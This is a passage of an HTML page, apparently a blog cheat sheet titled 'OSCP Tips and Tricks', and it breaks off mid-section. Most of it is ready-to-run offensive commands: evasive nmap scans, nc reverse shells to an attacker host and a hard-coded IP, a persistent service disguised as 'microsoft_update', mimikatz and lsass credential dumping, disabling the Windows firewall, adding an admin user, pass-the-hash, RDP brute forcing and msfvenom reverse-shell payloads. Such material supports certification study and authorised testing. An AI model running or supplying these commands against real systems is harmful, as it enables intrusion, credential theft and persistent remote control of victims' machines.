@@ -1,0 +1,913 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>OSCP Tips and Tricks &#8211; EK</title>
+<meta name="description" content="OSCP (Offensive Security Certified Professional) Handy Tips and Tricks.
+
+">
+<meta name="keywords" content="security, linux, oscp">
+
+
+
+<!-- Twitter Cards -->
+<meta name="twitter:title" content="OSCP Tips and Tricks">
+<meta name="twitter:description" content="OSCP (Offensive Security Certified Professional) Handy Tips and Tricks.
+
+">
+<meta name="twitter:site" content="@jivoi">
+<meta name="twitter:creator" content="@jivoi">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jivoi.github.io/images/default-thumb.png">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_GB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP Tips and Tricks">
+<meta property="og:description" content="OSCP (Offensive Security Certified Professional) Handy Tips and Tricks.
+
+">
+<meta property="og:url" content="https://jivoi.github.io/2015/07/01/oscp-tips-and-tricks/">
+<meta property="og:site_name" content="EK">
+
+
+
+
+
+<link rel="canonical" href="https://jivoi.github.io/2015/07/01/oscp-tips-and-tricks/">
+<link href="https://jivoi.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="EK Feed">
+
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://jivoi.github.io/assets/css/main.css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- HTML5 Shiv and Media Query Support -->
+<!--[if lt IE 9]>
+	<script src="https://jivoi.github.io/assets/js/vendor/html5shiv.min.js"></script>
+	<script src="https://jivoi.github.io/assets/js/vendor/respond.min.js"></script>
+<![endif]-->
+
+<!-- Modernizr -->
+<script src="https://jivoi.github.io/assets/js/vendor/modernizr-2.7.1.custom.min.js"></script>
+
+<link href='//fonts.googleapis.com/css?family=PT+Sans+Narrow:400,700%7CPT+Serif:400,700,400italic' rel='stylesheet' type='text/css'>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://jivoi.github.io/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://jivoi.github.io/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://jivoi.github.io/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://jivoi.github.io/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://jivoi.github.io/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jivoi.github.io/images/apple-touch-icon-144x144-precomposed.png">
+
+</head>
+
+<body class="post">
+
+<!--[if lt IE 9]><div class="browser-upgrade alert alert-info">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</div><![endif]-->
+
+<div class="navigation-wrapper">
+	<div class="site-name">
+		<a href="https://jivoi.github.io/">EK</a>
+	</div><!-- /.site-name -->
+	<div class="top-navigation">
+		<nav role="navigation" id="site-nav" class="nav">
+		    <ul>
+		        
+				    
+				        
+				    
+				    <li><a href="https://jivoi.github.io/archive/" >Archive</a></li>
+				
+				    
+				        
+				    
+				    <li><a href="https://jivoi.github.io/about/" >About</a></li>
+				
+				    
+				        
+				    
+				    <li><a href="https://jivoi.github.io/feed.xml" >Feed</a></li>
+				
+		    </ul>
+		</nav>
+	</div><!-- /.top-navigation -->
+</div><!-- /.navigation-wrapper -->
+
+
+
+<div id="main" role="main">
+  <div class="article-author-side">
+    
+
+
+
+	<img src="https://jivoi.github.io/images/avatar.jpg" class="bio-photo" alt="EK bio photo">
+
+<h3>EK</h3>
+<p>I'm a hacker and security researcher</p>
+<a href="mailto:ekoz@protonmail.com" class="author-widgets" target="_blank"><i class="fa fa-fw fa-envelope-square"></i> Email</a>
+<a href="http://twitter.com/jivoi" class="author-widgets" target="_blank"><i class="fa fa-fw fa-tw-square"></i> Twitter</a>
+
+
+
+
+
+<a href="http://github.com/jivoi" class="author-widgets" target="_blank"><i class="fa fa-fw fa-github"></i> Github</a>
+
+
+
+
+
+
+
+
+
+
+  </div>
+  <article class="post">
+    <div class="headline-wrap">
+      
+        <h1><a href="https://jivoi.github.io/2015/07/01/oscp-tips-and-tricks/" rel="bookmark" title="OSCP Tips and Tricks">OSCP Tips and Tricks</a></h1>
+      
+    </div><!--/ .headline-wrap -->
+    <div class="article-wrap">
+      <p>OSCP (Offensive Security Certified Professional) Handy Tips and Tricks.</p>
+
+<section id="table-of-contents" class="toc">
+<header>
+<h3>Contents</h3>
+</header>
+<div id="drawer">
+<ul id="markdown-toc">
+  <li><a href="#nmap-full-web-vulnerable-scan" id="markdown-toc-nmap-full-web-vulnerable-scan">Nmap Full Web Vulnerable Scan</a></li>
+  <li><a href="#dirb-dir-bruteforce" id="markdown-toc-dirb-dir-bruteforce">Dirb Dir Bruteforce:</a></li>
+  <li><a href="#nikto-web-server-scanner" id="markdown-toc-nikto-web-server-scanner">Nikto web server scanner</a></li>
+  <li><a href="#wordpress-scanner" id="markdown-toc-wordpress-scanner">WordPress Scanner</a></li>
+  <li><a href="#http-fingerprinting" id="markdown-toc-http-fingerprinting">HTTP Fingerprinting</a></li>
+  <li><a href="#skip-fish-scanner" id="markdown-toc-skip-fish-scanner">SKIP Fish Scanner</a></li>
+  <li><a href="#nmap-ports-scan" id="markdown-toc-nmap-ports-scan">Nmap Ports Scan</a></li>
+  <li><a href="#nc-scanning" id="markdown-toc-nc-scanning">NC Scanning</a></li>
+  <li><a href="#unicornscan" id="markdown-toc-unicornscan">Unicornscan</a></li>
+  <li><a href="#xprobe2-os-fingerprinting" id="markdown-toc-xprobe2-os-fingerprinting">Xprobe2 OS fingerprinting</a></li>
+  <li><a href="#samba-enumeration" id="markdown-toc-samba-enumeration">Samba Enumeration</a>    <ul>
+      <li><a href="#snmp-enumeration" id="markdown-toc-snmp-enumeration">SNMP Enumeration</a></li>
+      <li><a href="#windows-useful-cmds" id="markdown-toc-windows-useful-cmds">Windows Useful cmds</a></li>
+      <li><a href="#putty-link-tunnel" id="markdown-toc-putty-link-tunnel">PuTTY Link tunnel</a></li>
+      <li><a href="#enable-rdp-access" id="markdown-toc-enable-rdp-access">Enable RDP Access</a></li>
+      <li><a href="#turn-off-windows-firewall" id="markdown-toc-turn-off-windows-firewall">Turn Off Windows Firewall</a></li>
+      <li><a href="#meterpreter-vnc" id="markdown-toc-meterpreter-vnc">Meterpreter VNC</a></li>
+      <li><a href="#add-new-user-in-windows" id="markdown-toc-add-new-user-in-windows">Add New user in Windows</a></li>
+      <li><a href="#mimikatz-use" id="markdown-toc-mimikatz-use">Mimikatz use</a></li>
+      <li><a href="#passing-the-hash" id="markdown-toc-passing-the-hash">Passing the Hash</a></li>
+      <li><a href="#hashcat-password-cracking" id="markdown-toc-hashcat-password-cracking">Hashcat password cracking</a></li>
+    </ul>
+  </li>
+  <li><a href="#netcat-examples" id="markdown-toc-netcat-examples">Netcat examples</a></li>
+  <li><a href="#banner-grabbing-with-nc" id="markdown-toc-banner-grabbing-with-nc">Banner grabbing with NC</a>    <ul>
+      <li><a href="#window-reverse-shell" id="markdown-toc-window-reverse-shell">Window reverse shell</a></li>
+      <li><a href="#find-suidsgid-root-files" id="markdown-toc-find-suidsgid-root-files">Find SUID\SGID root files</a></li>
+      <li><a href="#python-shell" id="markdown-toc-python-shell">Python shell</a></li>
+      <li><a href="#pythonrubyphp-http-server" id="markdown-toc-pythonrubyphp-http-server">Python\Ruby\PHP HTTP Server</a></li>
+      <li><a href="#get-pids-of-process" id="markdown-toc-get-pids-of-process">Get PIDs of process</a></li>
+      <li><a href="#hydra-rdp-bruteforce" id="markdown-toc-hydra-rdp-bruteforce">Hydra rdp Bruteforce</a></li>
+      <li><a href="#mount-remote-windows-share" id="markdown-toc-mount-remote-windows-share">Mount Remote Windows Share</a></li>
+      <li><a href="#compiling-exploit-in-kali" id="markdown-toc-compiling-exploit-in-kali">Compiling Exploit in Kali</a></li>
+      <li><a href="#compiling-windows-exploits-on-kali" id="markdown-toc-compiling-windows-exploits-on-kali">Compiling Windows Exploits on Kali</a></li>
+      <li><a href="#nasm-commands" id="markdown-toc-nasm-commands">NASM Commands</a></li>
+      <li><a href="#ssh-pivoting" id="markdown-toc-ssh-pivoting">SSH Pivoting</a></li>
+      <li><a href="#ssh-pivoting-from-one-network-to-another" id="markdown-toc-ssh-pivoting-from-one-network-to-another">SSH Pivoting from One Network to Another</a></li>
+      <li><a href="#pivoting-using-metasploit" id="markdown-toc-pivoting-using-metasploit">Pivoting Using metasploit</a></li>
+      <li><a href="#exploit-db-search-using-csv-file" id="markdown-toc-exploit-db-search-using-csv-file">Exploit-DB search using CSV File</a></li>
+      <li><a href="#msf-payloads" id="markdown-toc-msf-payloads">MSF Payloads</a></li>
+      <li><a href="#msf-linux-reverse-meterpreter-binary" id="markdown-toc-msf-linux-reverse-meterpreter-binary">MSF Linux Reverse Meterpreter Binary</a></li>
+      <li><a href="#msf-reverse-shell-c-shellcode" id="markdown-toc-msf-reverse-shell-c-shellcode">MSF Reverse Shell (C Shellcode)</a></li>
+      <li><a href="#msf-reverse-shell-python-script" id="markdown-toc-msf-reverse-shell-python-script">MSF Reverse Shell Python Script</a></li>
+      <li><a href="#msf-reverse-asp-shell" id="markdown-toc-msf-reverse-asp-shell">MSF Reverse ASP Shell</a></li>
+      <li><a href="#msf-reverse-bash-shell" id="markdown-toc-msf-reverse-bash-shell">MSF Reverse Bash Shell</a></li>
+      <li><a href="#msf-reverse-php-shell" id="markdown-toc-msf-reverse-php-shell">MSF Reverse PHP Shell</a></li>
+      <li><a href="#msf-reverse-win-bin" id="markdown-toc-msf-reverse-win-bin">MSF Reverse Win Bin</a></li>
+      <li><a href="#linux-security-commands" id="markdown-toc-linux-security-commands">Linux Security Commands</a></li>
+      <li><a href="#win-buffer-overflow-exploit-commands" id="markdown-toc-win-buffer-overflow-exploit-commands">Win Buffer Overflow Exploit Commands</a></li>
+      <li><a href="#seh---structured-exception-handling" id="markdown-toc-seh---structured-exception-handling">SEH - Structured Exception Handling</a></li>
+      <li><a href="#rop-dep" id="markdown-toc-rop-dep">ROP (DEP)</a></li>
+      <li><a href="#aslr---address-space-layout-randomization" id="markdown-toc-aslr---address-space-layout-randomization">ASLR - Address space layout randomization</a></li>
+      <li><a href="#egg-hunter-techniques" id="markdown-toc-egg-hunter-techniques">EGG Hunter techniques</a></li>
+      <li><a href="#gdb-debugger-commands" id="markdown-toc-gdb-debugger-commands">GDB Debugger Commands</a></li>
+      <li><a href="#bash-reverse-shell" id="markdown-toc-bash-reverse-shell">BASH Reverse Shell</a></li>
+      <li><a href="#perl-reverse-shell" id="markdown-toc-perl-reverse-shell">PERL Reverse Shell</a></li>
+      <li><a href="#ruby-reverse-shell" id="markdown-toc-ruby-reverse-shell">RUBY Reverse Shell</a></li>
+      <li><a href="#python-reverse-shell" id="markdown-toc-python-reverse-shell">PYTHON Reverse Shell</a></li>
+      <li><a href="#php-reverse-shell" id="markdown-toc-php-reverse-shell">PHP Reverse Shell</a></li>
+      <li><a href="#java-reverse-shell" id="markdown-toc-java-reverse-shell">JAVA Reverse Shell</a></li>
+      <li><a href="#netcat-reverse-shell" id="markdown-toc-netcat-reverse-shell">NETCAT Reverse Shell</a></li>
+      <li><a href="#telnet-reverse-shell" id="markdown-toc-telnet-reverse-shell">TELNET Reverse Shell</a></li>
+      <li><a href="#xterm-reverse-shell" id="markdown-toc-xterm-reverse-shell">XTERM Reverse Shell</a></li>
+      <li><a href="#xss-cheat-codes" id="markdown-toc-xss-cheat-codes">XSS Cheat Codes</a></li>
+    </ul>
+  </li>
+</ul>
+
+  </div>
+</section>
+<!-- /#table-of-contents -->
+
+<h3 id="nmap-full-web-vulnerable-scan">Nmap Full Web Vulnerable Scan</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /usr/share/nmap/scripts/
+wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz <span class="o">&amp;&amp;</span> tar xzf nmap_nse_vulscan-2.0.tar.gz
+nmap -sS -sV --script<span class="o">=</span>vulscan/vulscan.nse target
+nmap -sS -sV --script<span class="o">=</span>vulscan/vulscan.nse –script-args <span class="nv">vulscandb</span><span class="o">=</span>scipvuldb.csv target
+nmap -sS -sV --script<span class="o">=</span>vulscan/vulscan.nse –script-args <span class="nv">vulscandb</span><span class="o">=</span>scipvuldb.csv -p80 target
+nmap -PN -sS -sV --script<span class="o">=</span>vulscan –script-args <span class="nv">vulscancorrelation</span><span class="o">=</span><span class="m">1</span> -p80 target
+nmap -sV --script<span class="o">=</span>vuln target
+nmap -PN -sS -sV --script<span class="o">=</span>all –script-args <span class="nv">vulscancorrelation</span><span class="o">=</span><span class="m">1</span> target</code></pre></div>
+
+<h3 id="dirb-dir-bruteforce">Dirb Dir Bruteforce:</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</code></pre></div>
+
+<h3 id="nikto-web-server-scanner">Nikto web server scanner</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">nikto -C all -h http://IP</code></pre></div>
+
+<h3 id="wordpress-scanner">WordPress Scanner</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">git clone https://github.com/wpscanteam/wpscan.git <span class="o">&amp;&amp;</span> <span class="nb">cd </span>wpscan
+./wpscan –url http://IP/ –enumerate p</code></pre></div>
+
+<h3 id="http-fingerprinting">HTTP Fingerprinting</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">wget http://www.net-square.com/_assets/httprint_linux_301.zip <span class="o">&amp;&amp;</span> unzip httprint_linux_301.zip
+<span class="nb">cd </span>httprint_301/linux/
+./httprint -h http://IP -s signatures.txt</code></pre></div>
+
+<h3 id="skip-fish-scanner">SKIP Fish Scanner</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">skipfish -m <span class="m">5</span> -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</code></pre></div>
+
+<h3 id="nmap-ports-scan">Nmap Ports Scan</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">1<span class="o">)</span>decoy- masqurade nmap -D RND:10 <span class="o">[</span>target<span class="o">]</span> <span class="o">(</span>Generates a random number of decoys<span class="o">)</span>
+1<span class="o">)</span>decoy- masqurade nmap -D RND:10 <span class="o">[</span>target<span class="o">]</span> <span class="o">(</span>Generates a random number of decoys<span class="o">)</span>
+2<span class="o">)</span>fargement
+3<span class="o">)</span>data packed – like orginal one not scan packet
+4<span class="o">)</span>use auxiliary/scanner/ip/ipidseq <span class="k">for</span> find zombie ip in network to use them to scan — nmap -sI ip target
+5<span class="o">)</span>nmap –source-port <span class="m">53</span> target
+nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu<span class="o">=</span><span class="m">24</span> –data-length<span class="o">=</span><span class="m">1337</span> -T2 target <span class="o">(</span> Randomize scan form diff IP<span class="o">)</span>
+nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
+nmap –script smb-check-vulns.nse -p445 target <span class="o">(</span>using NSE scripts<span class="o">)</span>
+nmap -sU -P0 -T Aggressive -p123 target <span class="o">(</span>Aggresive Scan T1-T5<span class="o">)</span>
+nmap -sA -PN -sN target
+nmap -sS -sV -T5 -F -A -O target <span class="o">(</span>version detection<span class="o">)</span>
+nmap -sU -v target <span class="o">(</span>Udp<span class="o">)</span>
+nmap -sU -P0 <span class="o">(</span>Udp<span class="o">)</span>
+nmap -sC 192.168.31.10-12 <span class="o">(</span>all scan default<span class="o">)</span></code></pre></div>
+
+<h3 id="nc-scanning">NC Scanning</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">nc -v -w <span class="m">1</span> target -z 1-1000
+<span class="k">for</span> i in <span class="o">{</span>101..102<span class="o">}</span><span class="p">;</span> <span class="k">do</span> nc -vv -n -w <span class="m">1</span> 192.168.56.<span class="nv">$i</span> 21-25 -z<span class="p">;</span> <span class="k">done</span></code></pre></div>
+
+<h3 id="unicornscan">Unicornscan</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">us -H -msf -Iv 192.168.56.101 -p 1-65535
+us -H -mU -Iv 192.168.56.101 -p 1-65535
+
+-H resolve hostnames during the reporting phase
+-m scan mode <span class="o">(</span>sf - tcp, U - udp<span class="o">)</span>
+-Iv - verbose</code></pre></div>
+
+<h3 id="xprobe2-os-fingerprinting">Xprobe2 OS fingerprinting</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">xprobe2 -v -p tcp:80:open IP</code></pre></div>
+
+<h2 id="samba-enumeration">Samba Enumeration</h2>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U <span class="s2">&quot;&quot;</span> target
+enum4linux target</code></pre></div>
+
+<h3 id="snmp-enumeration">SNMP Enumeration</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">snmpget -v <span class="m">1</span> -c public IP 
+snmpwalk -v <span class="m">1</span> -c public IP
+snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</code></pre></div>
+
+<h3 id="windows-useful-cmds">Windows Useful cmds</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">net localgroup Users
+net localgroup Administrators
+search dir/s *.doc
+system<span class="o">(</span><span class="s2">&quot;start cmd.exe /k $cmd&quot;</span><span class="o">)</span>
+sc create microsoft_update <span class="nv">binpath</span><span class="o">=</span><span class="s2">&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot;</span> <span class="nv">start</span><span class="o">=</span> auto <span class="nv">error</span><span class="o">=</span> ignore
+/c C:<span class="se">\n</span>c.exe -e c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe -vv 23.92.17.103 7779
+mimikatz.exe <span class="s2">&quot;privilege::debug&quot;</span> <span class="s2">&quot;log&quot;</span> <span class="s2">&quot;sekurlsa::logonpasswords&quot;</span>
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe <span class="s2">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="s2">&quot;log&quot;</span> <span class="s2">&quot;sekurlsa::logonpasswords&quot;</span>
+C:<span class="se">\t</span>emp<span class="se">\p</span>rocdump.exe -accepteula -ma lsass.exe lsass.dmp For <span class="m">32</span> bits
+C:<span class="se">\t</span>emp<span class="se">\p</span>rocdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For <span class="m">64</span> bits</code></pre></div>
+
+<h3 id="putty-link-tunnel">PuTTY Link tunnel</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">Forward remote port to <span class="nb">local </span>address
+plink.exe -P <span class="m">22</span> -l root -pw <span class="s2">&quot;1234&quot;</span> -R 445:127.0.0.1:445 IP</code></pre></div>
+
+<h3 id="enable-rdp-access">Enable RDP Access</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">reg add <span class="s2">&quot;hklm\system\currentcontrolset\control\terminal server&quot;</span> /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall <span class="nb">set </span>service remoteadmin <span class="nb">enable</span>
+netsh firewall <span class="nb">set </span>service remotedesktop <span class="nb">enable</span></code></pre></div>
+
+<h3 id="turn-off-windows-firewall">Turn Off Windows Firewall</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">netsh firewall <span class="nb">set </span>opmode disable</code></pre></div>
+
+<h3 id="meterpreter-vnc">Meterpreter VNC</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">run getgui -u admin -p 1234
+run vnc -p 5043</code></pre></div>
+
+<h3 id="add-new-user-in-windows">Add New user in Windows</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">net user <span class="nb">test </span><span class="m">1234</span> /add
+net localgroup administrators <span class="nb">test</span> /add</code></pre></div>
+
+<h3 id="mimikatz-use">Mimikatz use</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">git clone https://github.com/gentilkiwi/mimikatz.git
+privilege::debug
+sekurlsa::logonPasswords full</code></pre></div>
+
+<h3 id="passing-the-hash">Passing the Hash</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">git clone https://github.com/byt3bl33d3r/pth-toolkit
+pth-winexe -U <span class="nb">hash</span> //IP cmd
+
+or
+
+apt-get install freerdp-x11
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</code></pre></div>
+
+<h3 id="hashcat-password-cracking">Hashcat password cracking</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">hashcat -m <span class="m">400</span> -a <span class="m">0</span> <span class="nb">hash</span> /root/rockyou.txt</code></pre></div>
+
+<h2 id="netcat-examples">Netcat examples</h2>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">c:&gt; nc -l -p 31337
+<span class="c">#nc 192.168.0.10 31337</span>
+c:&gt; nc -v -w <span class="m">30</span> -p <span class="m">31337</span> -l &lt; secret.txt
+<span class="c">#nc -v -w 2 192.168.0.10 31337 &gt; secret.txt</span></code></pre></div>
+
+<h2 id="banner-grabbing-with-nc">Banner grabbing with NC</h2>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">nc 192.168.0.10 80
+GET / HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/4.0 
+Referrer: www.example.com
+&lt;enter&gt;
+&lt;enter&gt;</code></pre></div>
+
+<h3 id="window-reverse-shell">Window reverse shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">c:&gt;nc -Lp <span class="m">31337</span> -vv -e cmd.exe
+nc 192.168.0.10 31337
+c:&gt;nc example.com <span class="m">80</span> -e cmd.exe
+nc -lp 80
+ 
+nc -lp <span class="m">31337</span> -e /bin/bash
+nc 192.168.0.10 31337
+nc -vv -r<span class="o">(</span>random<span class="o">)</span> -w<span class="o">(</span><span class="nb">wait</span><span class="o">)</span> <span class="m">1</span> 192.168.0.10 -z<span class="o">(</span>i/o error<span class="o">)</span> 1-1000</code></pre></div>
+
+<h3 id="find-suidsgid-root-files">Find SUID\SGID root files</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Find SUID root files</span>
+find / -user root -perm -4000 -print
+ 
+<span class="c"># Find SGID root files:</span>
+find / -group root -perm -2000 -print
+ 
+<span class="c"># Find SUID and SGID files owned by anyone:</span>
+find / -perm -4000 -o -perm -2000 -print
+ 
+<span class="c"># Find files that are not owned by any user:</span>
+find / -nouser -print
+ 
+<span class="c"># Find files that are not owned by any group:</span>
+find / -nogroup -print
+ 
+<span class="c"># Find symlinks and what they point to:</span>
+find / -type l -ls</code></pre></div>
+
+<h3 id="python-shell">Python shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span></code></pre></div>
+
+<h3 id="pythonrubyphp-http-server">Python\Ruby\PHP HTTP Server</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">python2 -m SimpleHTTPServer
+python3 -m http.server
+ruby -rwebrick -e <span class="s2">&quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start&quot;</span>
+php -S 0.0.0.0:8888</code></pre></div>
+
+<h3 id="get-pids-of-process">Get PIDs of process</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">fuser -nv tcp <span class="m">80</span> 
+fuser -k -n tcp 80</code></pre></div>
+
+<h3 id="hydra-rdp-bruteforce">Hydra rdp Bruteforce</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</code></pre></div>
+
+<h3 id="mount-remote-windows-share">Mount Remote Windows Share</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">smbmount //X.X.X.X/c<span class="nv">$ </span>/mnt/remote/ -o <span class="nv">username</span><span class="o">=</span>user,password<span class="o">=</span>pass,rw</code></pre></div>
+
+<h3 id="compiling-exploit-in-kali">Compiling Exploit in Kali</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">gcc -m32 -o output32 hello.c <span class="o">(</span><span class="m">32</span> bit<span class="o">)</span>
+gcc -m64 -o output hello.c <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span></code></pre></div>
+
+<h3 id="compiling-windows-exploits-on-kali">Compiling Windows Exploits on Kali</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+wine mingw-get-setup.exe
+<span class="k">select</span> mingw32-base
+<span class="nb">cd</span> /root/.wine/drive_c/windows
+wget http://gojhonny.com/misc/mingw_bin.zip <span class="o">&amp;&amp;</span> unzip mingw_bin.zip
+<span class="nb">cd</span> /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+wine ability.exe</code></pre></div>
+
+<h3 id="nasm-commands">NASM Commands</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">nasm -f bin -o payload.bin payload.asm
+nasm -f elf payload.asm<span class="p">;</span> ld -o payload payload.o<span class="p">;</span> objdump -d payload</code></pre></div>
+
+<h3 id="ssh-pivoting">SSH Pivoting</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">ssh -D 127.0.0.1:1080 -p <span class="m">22</span> user@IP
+Add socks4 127.0.0.1 <span class="m">1080</span> in /etc/proxychains.conf
+proxychains commands target</code></pre></div>
+
+<h3 id="ssh-pivoting-from-one-network-to-another">SSH Pivoting from One Network to Another</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">ssh -D 127.0.0.1:1080 -p <span class="m">22</span> user1@IP1
+Add socks4 127.0.0.1 <span class="m">1080</span> in /etc/proxychains.conf
+proxychains ssh -D 127.0.0.1:1081 -p <span class="m">22</span> user1@IP2
+Add socks4 127.0.0.1 <span class="m">1081</span> in /etc/proxychains.conf
+proxychains commands target</code></pre></div>
+
+<h3 id="pivoting-using-metasploit">Pivoting Using metasploit</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">route add IP 255.255.255.0 1
+use auxiliary/server/socks4a
+run
+proxychains msfcli windows/* <span class="nv">PAYLOAD</span><span class="o">=</span>windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> <span class="nv">RHOST</span><span class="o">=</span>IP E</code></pre></div>
+
+<h3 id="exploit-db-search-using-csv-file">Exploit-DB search using CSV File</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">git clone https://github.com/offensive-security/exploit-database.git
+<span class="nb">cd </span>exploit-database
+./searchsploit –u
+./searchsploit apache 2.2
+./searchsploit <span class="s2">&quot;Linux Kernel&quot;</span>
+
+cat files.csv <span class="p">|</span> grep -i linux <span class="p">|</span> grep -i kernel <span class="p">|</span> grep -i <span class="nb">local</span> <span class="p">|</span> grep -v dos <span class="p">|</span> uniq <span class="p">|</span> grep 2.6 <span class="p">|</span> egrep <span class="s2">&quot;&lt;|&lt;=&quot;</span> <span class="p">|</span> sort -k3</code></pre></div>
+
+<h3 id="msf-payloads">MSF Payloads</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP Address&gt; X &gt; system.exe
+msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> R &gt; exploit.php
+msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -e -a x86 --platform win -f asp -o file.asp
+msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -e x86/shikata_ga_nai -b <span class="s2">&quot;\x00&quot;</span> -a x86 --platform win -f c</code></pre></div>
+
+<h3 id="msf-linux-reverse-meterpreter-binary">MSF Linux Reverse Meterpreter Binary</h3>
+
